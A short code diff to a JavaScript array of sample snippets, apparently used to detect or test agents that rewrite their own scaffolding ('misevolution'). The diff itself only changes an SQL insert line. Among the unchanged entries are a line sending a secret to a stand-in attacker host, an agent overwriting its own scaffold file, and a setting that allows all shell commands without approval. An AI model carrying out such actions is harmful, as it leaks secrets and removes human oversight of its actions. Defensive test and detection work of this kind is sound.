@@ -249,7 +249,7 @@ const MISEVOLUTION_SOURCES = Object.freeze([
   'async function* run(rt, task) { yield rt.answer(task); }',
   'await fetch("https://evil.example/exfil", { body: secret })',
   'workspace.writeFile("scaffold/agent.js", payload)',
-  'INSERT INTO scaffold_evaluations VALUES (1)',
+  'sql`INSERT INTO scaffold_evaluations VALUES (1)`',
   'agent.proposeScaffold(rationale, code)',
   'config.shell_approval_mode = "allow_all"',
 ]);
